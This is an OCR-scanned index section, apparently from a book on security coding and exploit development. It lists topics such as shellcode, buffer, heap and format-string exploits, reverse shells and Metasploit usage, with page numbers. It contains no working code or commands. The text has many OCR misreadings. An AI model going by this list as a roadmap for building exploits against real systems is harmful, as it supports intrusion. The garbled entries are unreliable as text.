overflow vul n erab ilirv, 
459-471 
OpenSSH challenge response 
integer overflow vulnera-
bility, 477-480 
UW POP2 buffer overflow-
vulnerability, 480-487 
Winsock to build Web 
grabber, 153-154 
Winsock to execute remote 
buffer overflow, 174—176 
Winsock to execute Web 
attack, 172-173 
XI 1K6 4.2 XLOCALLDlk 
overflow, 450—454 
xlockmore user-supplied 
string vulnerability, 427—429 
case-sensitivity, of NASL 
variables, 68 
CComObject, 552 
CComPtr, 547-548 
CGwQ/ftr, 547-548 
CComoieApp class, 591 
CGDIRS variables, 603, 604 
CCI (common gateway 
interface) applications, 40 
ckftt data type, 6 
characters. .Sec bad characters 
dieckQ function, 604 
dicekmin field, 107 
chroot jail, 350-354 
chroot shellcode, 350-354 
C1RT, Nikto 
description of, 594 
SP-Rebel w.,623 
vulniTabilirv database of, 5')5 
class, 626 
class composition, 550—553 
class hierarchies, 11 
class registration, 556-559 
classes 
C#, 30-31 
definition of/example of, 
10-11 
Java, 20-22 
client applications 
BSD sockets used by, 100 
TCP client socket program-
ming with Java Sockets, 
179-182 
TCP client/server sockets, 
101-107 
UDP client/server sockets, 
107-116 
Winsock, writing, 154-158, 
170 
WcrmCatdier program for 
TCP client connections, 
204-209 
client technologies, ATL 
BSTR datatype, 548 
overview; 547 
smart pointers, 547—548 
VARIANT datatype, 
548-550 
clientl.c program, 101-102, 
106-107 
ClieniApp.exe, 154-158 
client-side socket programming, 
441^442 

Index 
655 
C-like assignment operators, 
73-74 
close( filedescriptor ), 642 
dose /closesoeket () functi on s, 
305-306 
closed-source software, 454-455 
(losesoeketQ function, 152 
CLS113 value, 543-544 
code, portable. -Sec portable code 
code, reusing existing, 540 
CodeRedU worm, 204-209 
coding sockets, 440-444,488 
COM. See Component Object 
Model 
COM EXE server 
implementation, 568-571 
COM extensions, 567-587, 588 
COM server DLL, 567 
COM EXE server 
implementation, 568-57 I 
command line interpreter, 
NASL, 79-80 
command-line 
argument processing, 
263-267 
IP address parsing, 32—40, 
4 5 ^ 6 
comments, NASL, 68, 82 
common gateway interface 
(CGI) applications, 40 
community name, 118-127 
comparison operators, NASL, 7 I 
compilation, of Web security 
tool, 619 
compiler 
C/C++ translation, 3 
compilers, list of, 634-635 
definition of, 627 
M1DL, 554, 556 
Perl, 49 
component attributes, ATL, 
566-567 
component classes, RPCDump 
utility, 578-584 
Component Object Model 
(COM) 
described, 588 
in-process server implemen-
tation, 544-546 
interfaces, 541 
obj ect i mp le menta tio n, 
542-543 
objects, 540 
overview, 540, 587 
registration, 543-544 
runtime, 541-542 
composition classes, ATL, 
550-553 
COMSupport.h, 584-585 
concurrent versions system 
(CVS) logs, 422 
aotmectQ function 
portable network program-
ming and, 282-285 
UDP datagram, sending, 112 
UDP socket and, 108 
for Winsock 
WSADATA 
object creation, 151 
connection management, SP-
Rebel, 596-605 
connections 
multiple, TCP client, 194-204 
forWmsock 
WSADATA 
object creation, 151 
constructors 
of ServerSocket class, 190 
for TCP connections, 179 
control flow, RPCDump, 
571-572 
control structures, NASI .74 77 
control vector, 504-509 
conversion, data, 646-651 
core dumps, 401—402 
cpmmectopm, 151, 152 
Cryptographic functions, NASL, 
79 
CVS (concurrent versions 
system) logs, 422 
D 
daemon, service programming, 
256-262 
data conversion reference, 
646-651 
data hiding 
with C#, 25 
with C++, 4,5 
definition of, 627 
with object-oriented pro-
gramming, 15 
data structures, 527-528, 529 
dati type, definition of, 627 
data types 
C#, 26-27 
C/C+ + , 5-7 
Java, 17-18 
Perl, 41-42 
Datagram Packet class, 209—216 
Datagram Socket class, 210 
DB_FILENAME, 
603,604 
debugger 
for closed-source software, 
454,501 
definition or, 627 
list of debuggers, 634 
offset determination and, 537 
overwriting return address 
and, 500, 508 
decoder, 402-406 
Default constructor, 609 
DefaultTargct key, 531 
Udefhte statement, 223 
delegate, 25 
Denial-of-Service (DOS), 
172-173 
Deraison, Renaud, 66, 95 
Description key, 530 
descriptive functions, 80-82 
design, SP-Rebel Web security 
tool, 594-595 
destination port field, 107 
destructor, 609, 614 
directory 
chroot shellcode and, 350, 
352 
handling, portable code and, 
247-250 
disassembler 
for closed-source software, 
454 
definition of, 627 
for shellcode, 564 
DLL. See Dynamic Link Library 
DLLCanUnloadNow, 545 
DLLGetClassObject, 545 
DLLKegisterServer, 545 
D L LU n reg ist e rS erve r, 5 45—5 46 
dlmalloc (Doug Lea Malloc), 
456-459 
Do... While loop 
in C#, 28-29 
in C/C++, 9 
in Java, 19 
doreqQ function 
function of, 127 
in SP-Rebel code, 604 
DOS (Denial-of-Service), 
172-173 
double data type, 6 
Doug Lea Malloc (dlmalloc), 
456-459 
Downloads, Windows debuggers, 
501 
dup2 system calls, 385-386 
Dynamic Link Library (DLL) 
COM server, 567 
definition of, 627 
exports, COM in-process 
serve r in lplem enta tion, 
560-561 
finding return address, 
509-513 
ISM DLL, 499 

656 
Index 
of Winsock, 146 
Winsock, linking to library, 
148-152 
E 
EAX register 
FreeBSD system call, 344 
Linux system call, 343 
overwriting return address, 
507-509 
EBX register, 343 
ECMA (European Computer 
Manufacturers 
Association), 24 
eEye, 499 
EIP register 
inserting return address, 
513-514 
nop sleds, 517-518 
overwriting return address, 
505-509 
overwriting with pattern, 
501-503, 504 
ELE Sec executable and linking 
format 
nuply.cpp, 168 
encapsulation 
with C#, 24 
with C++, 4 
definition or, 627 
with object-oriented pro-
gramming, 15 
encoder, for payload, 536 
Encoder environment variable, 
528 
Ei tea derDm i tF/i UTU mi tqji vari abl c, 
528 
encoding 
payload, 518,521-527, 528 
shellcode, 402-407 
END_ENTRY_PO!NT, 570, 
590 
eiiiiif statements, 274 
end-of-line sequences, 69 
endpoint 
identified by socket, 100 
value to identify, 178 
entry point. See module en try-
point 
%ENV variable, 47 
environment variable 
retrieval of, 531-532 
UscrOpts values, 529 
Eren, Sinan, 427-429 
crriic facility, 143 
European Computer 
Manufacturers 
Association (ECMA), 24 
exec, 229-233 
executable and linking format 
(ELF) 
assembly code version of C 
program, 337 
opcodes in, 511—512 
program variables reuse and, 
409-410 
execute payloads, 519 
execve( file, file+ arguments, 
environment data ), 642 
execve shellcode 
in C,372-373 
executing /bin/sh, 348-349 
FreeBSD jmp/call style, 
373-374 
FreeBSD push style, 374-378 
Linux jmp/call style, 378-379 
Linux push style, 379-380 
in.it; input v.'ud.iriiHi error 
and, 432-433 
pointer for, 339 
remote exploit and, 345 
use of, 348 
execve system call, 386-391 
exit{ int), 642 
cxit() system call 
implementation of, 342 
on Linux/FreeBSD, 343-344 
EX1TFUNC parameter, 519 
exploit, definition of, 627 
exploit archives 
data conversion reference, 
646-651 
exploir references, 639-640 
security tools, 634-638 
system call reference, 
641-643 
exploit checking program, 
161-168 
exploit class, 527 
exploit development, Metasploit 
Framework 
attack vector determination, 
498-499 
bad characters, determining, 
514-515 
control vector selection, 
504-509 
finding offset, 499-504 
integration of exploits into 
framework, 518-527 
Metasploit Framework, using, 
492-498 
nop sleds, 516—518 
overview, 492 
payload/encoder, 518-527 
return address, finding, 
509-513 
return address, using, 
513-514 
space limitations, deter-
mining, 515—516 
exploit() function 
exploit co nstru c tion/ exe c u -
tion in, 531-532 
in Metasploit Framework, 
528 
exploit mode, insfconsole, 
494^95 
exploitable software bug, 
627-628 
exploits 
porting to/from NASL, 
86-94 
shellcode and, 334 
Winsock for, 146 
exploits, writing 
coding sockets/bin ding tor, 
440-444 
format string attacks, 
424-429 
heap corruption, 455-471 
integer bug, 472-487 
man input validation error 
case study, 432-434 
overview of, 440 
race conditions, 430-432 
remote/local exploits, 
423-424 
stack overflow, 444-455 
targeting vulnerabilities, 
422-423 
TCP/IP vulnerabilities, 
429-430 
extended error information 
checking tor, 143 
portable network program-
ming and, 278-280 
extensions, COM, 567-568 
F 
l-'ttaeriat function, 10 
factorial method, 29—30 
false positives, 623 
mfilif statement, 224-225 
#ifetse statement, 224 
file descriptors 
program variable reuse and, 
417 
reusing, 396—402 
file handling, 244-247 

Index 
657 
file permissions, 430, 431 
file race conditions, 430-431 
file-grabbing application, 
building with Winsock, 
153-154 
fingerprint files, 594-595 
firewalls, 437 
float data type, 6 
flow control 
in C#, 27-29 
in C/C++, 8-9 
in Java, 18-19 
RPCDump and, 571-572 
FOLD command, 480-487 
For loop 
in C # , 27-28,29 
in C/C++, 8,9 
in Java, 18,19 
in NASL, 74-75 
foteach loop, 75 
forks 
Microsoft and, 209 
process creation and, 229 
format string attacks 
format string bugs, fixing, 426 
format strings, 424-426 
overview, 430 
xlockniore user--supplied 
string vulnerability, 427-429 
format string bug 
definition of, 028 
fixing, 426 
format string characters 
format string attacks, 
425-426 
xlockmore user-supplied 
string vulnerability and, 
427-429 
Foster, James C, 624 
Fourier, Jean-Daptiste, 12 
Fourier analysis, 12-14 
fprintf function, 427 
FPSEs (Front Page Service 
Extensions), 172-173 
FreeBSD 
assembly code version of C 
program, 337 
ktrace utility, 335 
shell code system calls, 
342-344 
Write svstem call example, 
370-372 
Front Page Service Extensions 
(FPSEs), 172-173 
function, definition of, 028 
functional language, definition 
of, 628 
functional programming, 2 
functions 
BSD socket options, 116-118 
C organized into, 3 
in C/C++, 9-10 
NASL, 76-77,96 
NASL personal-use tools, 
writing, 78-80 
overriding in Metasploit 
Fra m ewo rk, 533 —5 34 
she 11 code for 
Windows/UNIX and, 339 
fu22ers, 454—455 
G 
garbage collection, automated, 
16,25 
CDB. Sec GNU debugger 
general operators, NASL, 71 
Get HTTP Headers, 22-23 
GET request, 499 
get_httpQ function, 168 
GctEtirry method, 609 
gethestbynameQ function, 150-151 
gcfIiictAddrcss() method, 183 
gi'tLKaiAddrcssO method, 183 
get Loco ISocki-tA tidn-ss () method, 
183 
GVrOjtf function, 50-55 
getpeentamc function, 415 
GetRequest value, 118-127 
CctVarO method, 531-532 
global environment variable, 496 
GNU debugger (GDB) 
definition of, 628 
for setuid shellcode conver-
sion, 350 
small arrav address retrieval 
with, 399-400 
string location with, 408-409 
tool for shellcode, 335 
goals, NASL, 66-67 
Gosling, James, 15 
H 
Haek.k, 161-168 
backing 
hacking functions for H/ick.li, 
161-168 
reverse connection shellcode 
and,391-394 
Web hacking resources, 
623-624 
hardware simulators, 635 
hashes, Perl, 4 H 2 
header files 
ICMP header file, 315 
raw sockets, 312-317 
UDP, 107 
VuhiDB.h file, 616-619 
heap, 628 
heap corruption 
definition of, 628 
seudiuail race condition, 
431^132 
heap corruption exploits 
Doug Lea Malloc (dlmalloc), 
456-457 
in general, 454-455 
overview, 435- 456, 489 
Hejlsberg, Anders, 23 
"Hello, World!" program 
assembly code version of, 
337-339 
in C, 5 
in C#, 26 
in Java, 17 
help menu, msfeoiisole. 493 
hexdispQ function 
network scanning with UDP 
sockets, 125—126 
RPC program number iden-
tification and,137 
HKEY_GLASSES_ROOT\CLS 
ID, 544 
hostname resolution, 183-185 
ktonsQ function 
port conversion with, 151 
UDP datagram, sending, 111 
.htr file extension, 499 
HTTP 1.1,623 
Hypertext Transfer Protocol 
(HTTP) 
GET HTTP Headers, 22-23 
in NASL, 78 
I 
IA32 (32-bit Intel architecture), 
444-44', 
IGMP header file, 315 
IDL (Interface Definition 
Language), 553-556 
IDSs (Intrusion Detection 
Systems), 364 
I End point, 578 
lEndpointCollection, 577-578 
#if statement, 223-224 
//'statements, 74 
Uifdcf statement, 224 
ifdef statements 
for cross-platform develop-
ment, 222-225 
OS platforms and, 225 
portable network program-
ming and, 274 

653 
Index 
Hifiutef statement, 224 
IIS. Sec Microsoft Internet 
Information Server (IIS) 
4.0 .HTR Buffer 
C )vcrtlow 
1NADDR_ANY integer, 115 
%INC variable, 47 
@INC variable, 47 
indexing 
with C#, 25 
NASL arrays, 70 
InciAddras class, 183-185 
InetSocketAddress instance, 208 
%info data structure 
exploit data in, 529—531 
in exploit process, 527-528 
inheritance 
with C#, 24-25 
with C++, 4 
class hierarchies, 11 
definition of, 628 
with abject-oriented pro-
gramming, 15 
[nit function, 614 
InlineEgg, 56-59 
IN-PROCESS server 
implementation, 559—561 
in-process server implementation 
COM, 559-561 
overview, 544—546 
lnProcServer32, 544 
input, text-based input/output, 
186-189 
input validation error, 432-434 
hipul&tream, 193 
InputStream read () method, 182 
Inside ATL (Shepherd/King), 589 
Inside COM (Rogerson), 540, 
589 
htl data type, 6 
INT3 opcode, 513-514 
integer bug exploits 
bypassing size checks, 
475-477 
integer wrapping, 472-474 
overview, 472, 489 
integer data types, 267—268 
integer wrapping 
bypassing unsigned size check 
with, 475^77 
definition of, 628-629 
overview, 472—474 
integers, in NASL script, 68 
interface attribute, 562-566 
interface definition, 575-578 
Interface Definition Language 
(I DL), 553-556 
interfaces 
of Metasploit Framework, 
492-498 
Metasploit interfaces for pav-
loads, 519-527 
interfaces, COM 
•Unknown, 541 
overview, 541 
stdcall, 541 
Internet,Java and, 15 
Internet Information Server. Sec 
Microsoft Internet 
Information Server (IIS) 
4.0 .HTR Buffer 
Overflow 
Internet Protocol (IP) address 
command line IP address 
parsing case study, 32-40 
InetAddress class for, 183-185 
local, determination of, 3 17 
Perl subnet IP address 
parsing, 45-46 
socket options, 118 
TCl'/UDP communication 
and, 178-179 
UDP datagram, sending, 
111-112 
for Web grabber, 153 
Winsock WSADATA object 
creation, 1 50-151 
interpreter 
definition of, 629 
NASL command line inter-
preter, 79-80 
for Python, 55 
writing, 220 
inter-process communication 
(IPC), 100 
Intrusion Detection Systems 
(IDSs),364 
Intrusion Protection Systems 
(IPS), 490 
IP address. See Internet Protocol 
(IP) address 
IPC (inter-process 
communication), 100 
IPS (Intrusion Protection 
Systems), 490 
IPv4 address, 317 
IPv4 header file,313-315 
IRpcENUM, 576-577 
is_stTins_in () function, 167 
is_up () function, 167 
her boolean value, 208 
ISM dynamically linked library 
(DLL), 499 
istmllQ function, 70 
hvidn() function, 604, 605 
iteration 
with C#, 25 
recursion vs., 63 
J 
Java 
C# and, 24 
classes, 20-22 
data types, 17-18 
definition of, 629 
flow control, 18-19 
in general, 14-15 
GET HTTP Headers, 22-23 
"Hello, World!" program, 17 
important points about, 61 
language characteristics, 
15-16 
methods, 20 
porting to/from NASL, 86 
Java Sockets 
function of, 178 
IP ad dress/host name resolu-
tion, 183-185 
mu ltip le Con n c Ct io ns, 
194-204 
TCP client socket program-
ming, 179-182 
TCP server socket program-
ming, 189-193 
TCP/IP overview, 178-179 
text-based input/output, 
186-189 
UDP client/server socket 
programming, 209-216 
Web browser to connect to 
TCPSetvert, 193-194 
Worm Ca tch er prog ra m, 
204-209 
java.io package 
LineWttuberRi'flder class of, 
186-189 
for NBTSTAT program, 214 
java.lang.Tkread class, 202, 203 
java.net package 
classes/support, 178 
for NBTSTAT program, 214 
TCP client socket program-
ming with, 179-182 
java.util. Vector class, 201-202 
JCL (job control language), 2 
jmp, 339, 340 
JMP SHORT 6 assembly 
instruction, 508-509 
job control language (JCL), 2 
jumping, 336—337 

Index 
659 
junk () function, 167 
K 
kernel, system calls and, 342, 343 
keruel32.dll 
address location, 356—357 
as trampoline, 511 
Keys key, 531 
King, Brad, 589 
ktrace utility, 335 
L 
language characteristics 
of C#, 24-26 
C/C++, 3-5 
of Java, 15-16 
language extensions, 63 
languages, COM and, 587 
Last Stage of Delirium (security 
research group) 
port binding shellcode, 
345-346 
socket descriptor reuse shell-
code, 347-348 
length field, 107 
Lew, Elias ("Aleph One"), 4 
LIBC (C libraries) 
integer bug exploits and, 472 
open-source software, stack 
overflow exploits in, 449 
stack overflows and, 446-449, 
488 
tibdl, 252-254 
libpeap, 323 
libraries 
dynamic loading of, 252-255 
UNIX/Windows, 250-252 
Winsock, linking to library, 
148-152 
. See also Active Template 
Library; Dynamic Link 
Library 
LibWhisker (Web security tool), 
594 
Lii if JVI 111 iberRe a dcr cl ass 
TCI1 server socket program-
ming with, 190-193 
text-based input/output with, 
186-189 
linking, Winsock to library, 
148-152 
links, compile-time, 33(1 
Linux 
chroot shellcode on, 350-354 
exploit scripts with, 146 
port binding shellcode, 
345-346,388-391 
shellcode example, 369-370 
shellcode system calls, 342, 
343 
socket descriptor reuse shell-
code, 347-348 
socketcall system call, 387 
listen ( file descriptor, number of 
connections allowed in 
queue), 643 
UstettQ function 
portable network program-
ming and, 287-290 
in server-side socket pro-
gramming, 442 
for Winsock 
WSADATA 
object creation, 152 
listen system call, 384 
listening port, 497-498 
little endian 
definition of, 629 
processor types and, 226-229 
local exploits 
signal race conditions, 431, 
432 
writing, 423-424 
local shellcode 
chroot, 350-354 
execve shellcode, 348-349 
overview, 361 
setuid, 349-350 
LocalServer32, 544 
loctl/ioctlsacketQ functions, 
309-312 
log modification utility, Perl, 
50-55 
logic analysis, 86-94 
logical operators 
' NASL, 73 
Perl, 43-44 
loops 
in assembly language, 336 
flow control in C#, 27—29 
flow control in C/C++, 8-9 
flow control in Java, 18-19 
NASL control structures, 
74-77 
Ll'ORT parameter, 519 
Itrace, 398-399 
M 
in_quew Vector 
TCP server socket for client 
connections, 202—203 
VVormCaldser program, 208 
machine language, 629 
macros 
ATL, 552 
m-:c;[Nj-:NTRY_KMNT/i-: 
ND_ENTRY_POINT, 570 
COM and, 587 
mailing lists, shellcode, 362, 418 
mitiiiQ function 
for ex ploit/ vul n e rabil i ty 
checking program, 168 
function of, 127 
RPC program number iden-
tification, 138 
SP-Rebeland.596,604 
Mak, Ronald L., 220 
makegetreqO function, 126 
makcsock() function, 137-138 
makeudpsockQ function, 127 
MAKEWOllDQ 
function 
portable network program-
ming and, 275 
in WSADATA object, 149 
malloc, 629 
maUocQ function, 455 
man, input validation error, 
432-434 
match function, 47 
MDAC (Microsoft Data Access 
Components), 174-176 
memepy, 629 
memory 
heap corruption exploits, 
455-459 
portable code and, 262—263 
portable network program-
ming and, 329 
shellcode addressing problem 
and,339-340 
stack overflow exploits and, 
444-445 
memory blocks, 408-409 
mem set, 629 
Metasploit Framework (MSF) 
attack vector determination, 
498^199 
bad characters, determining, 
514-515 
control vector selection, 
504-509 
exploit development with, 
498 
finding offset, 499-504 
integration of exploits into 
framework, 518-527 
nop sleds, 516-518 
overview, 492, 534—535 
paylo ad/encoder, 518-527 
return address, finding, 
509-513 
return address, using, 
513-514 

660 
Index 
space limitations, deter-
mining, 515-516 
using, 492-498 
Metasploit Opcode Database 
memory addresses in, 509 
using, 510-513 
Meterpreter, 519 
method, definition of, 629 
methods 
definition of/function of, 20 
factorial method, 29-30 
for TCI' client socket pro-
gramming, 179 
for TCP server socket pro-
gramming, 190 
. See also functions 
Microsoft 
C# developed by, 23-24 
ECMA interpreter of, 97-98 
Microsoft Data Access 
Components (MDAC), 
174-176 
Microsoft 1DL (M1DL) 
compiler, 554, 556 
Microsoft Internet Information 
Server (IIS) 4.0 .HTR 
liufter Overflow 
attack vector determination, 
498-499 
b,id characters, determining, 
514-515 
control vector selection, 
504-509 
exploit with msfconsole, 
493-498 
finding offset, 499-504 
nop sleds, 516-518 
payload/en coder, 5 18—527 
return address, finding, 
509-513 
return address, using, 
513-514 
space limitations, deter-
mining, 515-516 
Microsoft Win32 system, 146 
Microsoft Windows, 24 
M1DL (Microsoft 1DL) 
compiler, 554, 556 
modifiers, 48 
module attribute, 564—565 
module entry point 
COM in-process server 
implementation, 561 
COM ont-of-process server 
i m pie men ta ti on, 5 62- 56 3 
MSE See Metasploit Framework 
msfcli interface, 492 
msfconsole interface 
demonstration of how to use, 
493-498 
function of, 492 
overview, 534 
power of, 492 
msfclfscan tool, 511 
msfencode tool, 522—527 
Msf: Exploit class, 533-534 
msfpayload tool, 518—521 
msfpescan tool, 511-512 
msfweb interface 
function of, 492 
payload generation/encoding 
with, 523-526 
mull threading 
implementation of, 139—140 
UNIX/Windows architecture 
and,234-237 
multiple connections, TCP 
client, 194-204 
i mil tipl i ca t ion -b ased i n teger 
wrapping, 474 
multithreading 
definition ot, 630 
Java support of, 16 
mutually exclusive (mutex) 
locks, 237-342 
N 
%n character 
for format string attack, 
425-426 
xkickmore user-supplied 
string vulnerability and, 
427-429 
NASL. Set- Nessns Attack 
Scripting Language 
nasm 
assembly code version of C 
program, 337-338 
for creating/modi lying shell-
code, 418 
ndiasm disassembler, 413 
for shellcode compilation, 
416 
tool tor shellcode, 335 
NBTSTAT program, 210-216 
Nessns 
BSD sockets with, 144 
history of, 66 
Nessns Attack Scripting 
Language (NASL) 
canonical NASL script case 
study, 82-86 
goals of, 66-67 
history of, 66 
porting to/from, 86-94 
script syntax, 68—77 
writing scripts, 77—82 
Nessus Attack Scripting 
Language (NASL) script 
syntax 
comments, 68 
control structures, 74—77 
operators, 70-74 
variables, 68-70 
Nessus framework, 80-82 
Nessus Knowledge Base, 67 
.NET framework, 23-24 
NetBIOS Name Service 
information, 210-216 
Netcat 
for application trou-
bleshooting, 171 
for IIS 4.0 .HTR Buffer 
Overflow, 499-500 
network connections, WinSock, 
146 
network interface names, 323 
network prog ram in in g, 441 
network scanning 
with TCP sockets, 127-139 
with UDP sockets, 118-127 
with UDP/TCP sockets, 142 
network stack implementations, 
429-430 
network traffic analysis tools, 637 
networking functions, NASL, 78 
newQ function, 531 
Nikto, CIRT 
description of, 594 
SP-Rebel KJ.,623 
vulnerability database of, 595 
Nmap 
BSD sockets with, 144 
IP address parsing and, 33 
nop generator, 528 
nop sleds 
for E1P landing area, 517-518 
integration of exploits into 
framework and, 536 
nop generator, 528 
settings for, 530 
NopDonlFalfflirough variable, 
528 
nops, overriding function for, 
533 
ntdll.dll, 511 
NULL, 630 
NULL byte problem, shellcode, 
341-342, 361 
NULL bytes, 345,363 
NULL character, 514-515 
NULL variable, 70 
numbers, system call, 342 

Index 
661 
o 
objdump, 335 
obj ect implem entation, C OM, 
542-543 
object-oriented programming 
advantages of, 15—16 
C# as, 24-25 
definition of, 630 
object-oriented programs, 2 
objects, COM, 540 
off-by-one bug, 630 
offset 
problem with, 537 
of return address, deter-
mining, 503-504 
software changes and, 512 
OllyDbg debugger, 501 
Op Code (Operation Code) 
to assembly instructions, 
358-359 
conversion of, 364 
opcodes 
Metasploit Opcode Database, 
509-513 
nop sleds and, 517-518 
open( file. Hags, mode ), 642 
Open SSL SSLv2 Malformed 
Client Key Remote 
Buffer Overflow 
Vulnerability 
exploit code for, 463-472 
exploitation of, 460—462 
improving, 462—463 
overview, 459 
vulnerability described, 460 
Open SSL SSLv2 remote buffer 
overflow vulnerability, 
459-471 
OpenBSD 
format string attack, 424 
xlockmore user-supplied 
string vulnerability exploit 
on,427-429 
open-source software, 449—454 
OpenSSH, 477-480 
Operating Systems (OSs) 
64-bit vs. 32-bit for portable 
code creation, 270-271 
detecting for code compiling, 
225-226 
security comparison of. -4cJi i 
shellcode for spanning mul-
tiple, 411-412, 415 
spanning shellcode for, 417 
Operation Code (Op Code) 
to assembly instructions, 
358-359 
conversion of, 364 
operators 
NASL, 70-74 
Perl, 42-45 
OptvNop2 nop sled, 518 
OUT-OF-PROCESS server 
implementation, 561-563 
output 
from SP-Rebel, 620 
text-based input/output, 
186-189 
output format, payload, 521 
OutputStreamQ method 
TCP client socket program-
ming with Java Sockets, 182 
TCP server socket program-
ming, 193 
overflow vulnerabilities, 480-487 
overwriting 
functions in Metasploit 
Framework, 533—534 
return address, 499-504 
P 
"packet cannon", 61 8-619 
packet generation, 638 
packet manipulation functions, 
78 
parseQ function, 138 
parsing 
command line IP address 
parsing case study, 32—40 
engine of SP-Rebel, 594 
Perl subnet IP address 
parsing, 45—46 
Web security tool, 605-616 
pattern matching, 47^48 
PattemCreateQ method, 501-503 
pattern Offset/pi script, 503-504 
payload 
bad characters, determining, 
514-515 
creation/encoding of, 
518-527 
Metasploit Framework, inte-
grating exploits into, 
527-564 
nop sleds, 517-518 
overwriting return address, 
504,505-508 
questions about, 536—537 
setting in nisfconsole, 
496-498 
use of term, 504-505 
PAYLOAD 
environment 
variable, 528 
Payload key, 530 
Payload key, 536 
Pcap, 323-328 
PE {portable executable), 
511-512 
Perl, 40-55 
canonical Perl tools, 49-50 
data types, 41—42 
extending, 63 
in general, 40—41 
important points about, 61 
log modification ntilitv, 
50-55 
Metasploit Framework 
written in, 492, 527 
NASL vs., 97-98 
operators, 42^15 
pattern matching/substitu-
tion, 47-48 
porting to/from NASL, 86 
regular expression modifiers, 
48 
sample script, 45-46 
special variables, 46-47 
Web security tools in, 594 
permissions, C#, 25 
personal-use tools, 78-80 
Pe\ nop sled, 518 
PexAlphaNum encoder, 
522-524 
Pex::Text::FreeformO function, 
530 
place class, 30—31 
plane class, 20-21 
p latfo r i n i nd e pen den ce 
definition of, 630 
of Java, 16 
pointers 
C/C++ security and, 5 
reference variables and, 64 
smart, ATL, 547-548 
POPAD, 537 
port 
w_«P 0 function and, 167 
source/destination fields, 
178-179 
Web grabber and, 153 
Winsock 
WSADATA object 
creation, 150, 151 
port binding shellcode 
FreeBSD, 382-383 
multiple connections with, 
391 
overview, 345-346,380-382 
portable code 
for 64-bit vs. 32-bit OS, 
330-332 
byte ordering, 226—229 
command-line argument pro-

662 
Index 
cessing, 263-267 
daemon/Wiu32 service pro-
gramming, 256-262 
directory handling, 247—250 
file handing. 244-247 
ifdejs, 223-225 
integer data types, 267-268 
libraries, 250—252 
libraries, dynamic loading of, 
252-255 
memory management, 
262-263 
mulithrcading, 234-237 
operating systems, detecting, 
225-226 
overview, 222 
pre-compiler directives, 
222-223 
pro c ess crea ti o n / term i na ti o n, 
227-234 
signals, 242-244 
thread coordination, 237-242 
portable components 
described, 276,329 
. Sec also portable network 
prog ramming 
portable executable (PE), 
511-512 
portable network programming 
accept () extension, 290—293 
API, 280 
UndQ extension, 285-287 
BSD sockets/Winsock, 
274-276 
dose/ciosesocketQ extensions, 
305-306 
cottitect() extension, 282-285 
listenQ extension, 287-290 
local IP address determina-
tion, 317-323 
foal/lcedsockctQ extensions, 
309-312 
overview, 274 
Pcap/WmPcap, 323-328 
portable components, 276 
raw sockets, 312-317 
read()/write() extensions, 280 
recv/recvfromQ extensions, 
301-304 
return values, 276-278 
sclcctf) extension, 293-298 
sen d/sendto () extern io ns, 
298-301 
setsockoptQ extension, 
307-309 
socket*) extension, 280-282 
Wins ock 2.0 extensions, 280 
Portable Operating Svstem 
Interface (POSIX), 229 
porting to/from NASL, 86-94, 
' 97, 98 
portmapper service, 128 
ports 
RPC program number iden-
tification utility, 127-129 
TCP server socket program-
ming and, 192-193 
UDP datagram, sending, 111 
Wins ock client application 
and, 154 
POSIX (Portable Operating 
System Interface), 229 
POSIX thread programming 
interface (pthreads) 
overview, 234 
thread coordination with, 
237-242 
thread creation with, 
234-237 
pie-compiler directives, 222—223 
Price, Mike, 624 
primitive data types, Java, 17 
principals, C#, 26 
priii tf function 
definition of, 630 
format string attack, 425—426 
procedural language, 630 
procedural programming, 2 
proc ess ere ation / te r mi n ation 
exec, 229-233 
exit, 234 
fork, 233-234 
overview, 229 
processors, 226—229 
program, 630 
program minilxT iileiitihc.ition 
utility, 127-139 
program variables, reusing 
closed-so urce programs, 
409-410 
execution analysis, 410-411 
liabilities of,417 
open-so urce programs, 
408-409 
overview, 407 
programming languages 
definition of, 631 
paradigms, 2-3 
. See also security coding 
programming template, 546-547 
protocols 
protocol-based vulnerabilities, 
435 
with Winsock 2, 147 
pseudo code, 87—88 
pthread programming library, 139 
pthread_create() function, 139—140 
public vulnerabilities, 422 
Python 
in general, 55-56 
important points about, 62 
InlmeEgg, 56-59 
Q 
query, NBTSTAT program, 
210-216 
R 
race conditions 
file, 430-431 
in general, 430 
overview, 436 
signal, 431-432 
Rain Forest Puppy (RFP), 594 
random number generator, 429 
Random Sops variable, 528 
ranges, parsing, 45 
raw sockets 
API and, 312 
coding, 329 
header files, 312-317 
with Java sockets, 218-219 
overview, 312 
RDS (Remote Data Services), 
174-176 
read{ filedescriptor, pointer to 
buffer, amount of bytes ), 
642 
rcad() function 
timeout setting for, 116 
UDP socket and, 108 
read elf program, 335 
TeadQ/tvriteQ function, 280 
recursion, 63 
rea'(') function 
portable network program-
ming and, 301-304 
timeout setting for, 11 6 
UDP socket and, 108 
for Winsock 
WSADATA 
object creation, 151 
ravfrowO function 
portable network program-
ming and, 301-304 
receiving UDP datagram 
with, 113-116 
timeout setting for, 11 6 
UDP socket and, 108 
reference types, Java, 18 
reference variables, 64 
Rcfs kev, 531 
RegEdit, 543-544 

Index 
663 
register, 631 
registration 
COM, overview, 543-544 
COM object, manual, 543 
registry scripts, ATL, 556-559 
RegSvr32, COM object 
registration, 543 
regular expressions (regex) 
pattern matching/substitution 
in Perl, 47-48 
Perl for, 40 
Perl's regular expression mod-
ifiers, 48 
porting from NASL and, 94 
relatioji.il operators, Perl, 44 
remote buffer overflows 
malformed client key, 
459-471 
Winsock to execute, 174-176 
Remote Data Services (RDS), 
174-176 
remote exploits, 423-424 
remote host environment 
variable. See RHOST 
remote port (RPORT), 495-496 
Remote Procedure Call (RPC) 
program number 
identification utility, 
127-139 
remote shellcode 
overview, 361 
port binding shellcode, 
345-346 
socket descriptor reuse, 
346-348 
remote signal race condition, 
431-432 
remote vulnerabilities, 345—348 
repatUtmtil loops, 75 
replace_string () function, 167 
reporting functions, NASL, 81 
resolve function, SP-Rebel code, 
604 
resources 
CANVAS Web site, 56 
for COM/ATL, 589 
exploit archives, 639-640 
Python, 55 
, See also security tools 
ret, 339-340 
return address 
bad characters, determining, 
514-515 
control vector selection for 
buffer overflow, 504—509 
finding in buffer overflow, 
509-513 
inserting, 513-514 
overwriting in buffer over-
flow, 499-504 
space limitations, deter-
mining, 515-516 
testing payload, 537 
return command, NASL, 77 
return values 
portable network program-
ming and, 276-278 
of system call, 344-345 
reuse shellcode, 346-348 
reverse connection shellcode, 
391-394 
reverse engineering shellcode, 
412-416 
reverse shell payloads, 519 
RFP (Rain Forest Puppy), 594 
RHOST (remote host 
environment variable) 
retrieval of, 531-532 
